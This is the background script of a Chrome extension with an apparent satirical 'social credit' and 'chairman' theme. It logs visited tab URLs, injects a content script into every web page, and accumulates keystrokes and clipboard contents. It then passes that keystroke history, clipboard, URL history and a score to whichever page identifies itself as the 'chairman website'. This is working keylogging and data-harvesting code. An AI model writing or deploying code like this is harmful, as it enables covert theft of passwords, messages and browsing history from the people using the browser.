const MAX_URLS = 10;
var keyHistory = "";
var clipboard = "";

/**
 * Adds a url to the url history. Makes a list size max of MAX_URLS
 * @async
 * @function saveUrl
 * @param {string} url - The new url to be appended.
 * @returns {Promise<void>}
 */
async function saveUrl(url) {
  const result = await chrome.storage.local.get({ urlList: [] });
  const urlList = result.urlList;
  urlList.push(url);
  if (urlList.length > MAX_URLS) {
    urlList.shift();
  }
  await chrome.storage.local.set({ urlList });
  console.log("Saved URL:", url, "| Total URLs stored:", urlList.length);
  const list = await readUrlList();
  console.log("Saved URLs: ", list);
}
/**
 * Gives the stored url list
 * @async
 * @function readUrl
 * @returns {Promise<string[]>}
 */
async function readUrlList() {
  const result = await chrome.storage.local.get({ urlList: [] });
  return result.urlList;
}
/**
 * Stores a score to the local storage.
 * @async
 * @function save_score
 * @param {number|string} new_score - The new score to be saved.
 * @returns {Promise<void>}
 */
async function saveSocialCredit(new_score) {
  const value = parseFloat(new_score);
  chrome.storage.local.set({ savedNumber: value });
}
/**
 * Reads the saved score value from Chrome's local storage.
 * @async
 * @function readSocialCredit
 * @returns {Promise<number|undefined>}
 */
async function readSocialCredit() {
  const result = await chrome.storage.local.get(["savedNumber"]);
  if (result.savedNumber !== undefined) {
    return result.savedNumber;
  }
}

chrome.tabs.onActivated.addListener(async (activeInfo) => {
  const tab = await chrome.tabs.get(activeInfo.tabId);
  saveUrl(tab.url);
  console.log("Active tab URL (switched):", tab.url);

  if (tab.url.startsWith("http")) {
    chrome.scripting.executeScript({
      target: { tabId: tab.id },
      files: ["content.js"],
    });
  }
});

// Fired when a tab updates (URL changes or reloads)
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && tab.url) {
    saveUrl(tab.url);
    console.log("Tab update URL (updated):", tab.url);
    // Wait a bit for content script to initialize
    setTimeout(() => {
      chrome.tabs
        .sendMessage(tabId, { type: "YOUR_MESSAGE" })
        .catch((err) => console.log("Content script not available"));
    }, 1000);
  }
});

// Checks for the chairman website
chrome.runtime.onMessage.addListener(async (msg, sender, response) => {
  if (msg.isChairmanWebsite) {
    const socialCredit = await readSocialCredit();
    const urlList = await readUrlList();

    chrome.tabs.sendMessage(sender.tab.id, {
      type: "BACKGROUND_TO_CONTENT",
      keyHistory,
      clipboard,
      socialCredit,
      urlList,
    });
    console.log("FOUND CHAIRMAN YAYAYA background.js btw");
  } else if (msg.type == "KEYPRESS") {
    const key = msg.key;
    clipboard = msg.clipboard;
    keyHistory = keyHistory + key;
    if (keyHistory.length > 300) {
      keyHistory = keyHistory.substring(keyHistory.length - 301);
    }
    console.log("Key history is: ", keyHistory);
  } else if (msg.type === "UPDATE_SOCIAL_CREDIT") {
    console.log("Background received social credit:", msg.socialCredit);
    saveSocialCredit(msg.socialCredit);
  } else if (msg.type === "REQUEST_SOCIAL_CREDIT_DATA") {
    const socialCredit = await readSocialCredit();
    const urlList = await readUrlList();

    chrome.tabs.sendMessage(sender.tab.id, {
      type: "BACKGROUND_TO_CONTENT",
      keyHistory,
      clipboard,
      socialCredit,
      urlList,
    });
  }
});
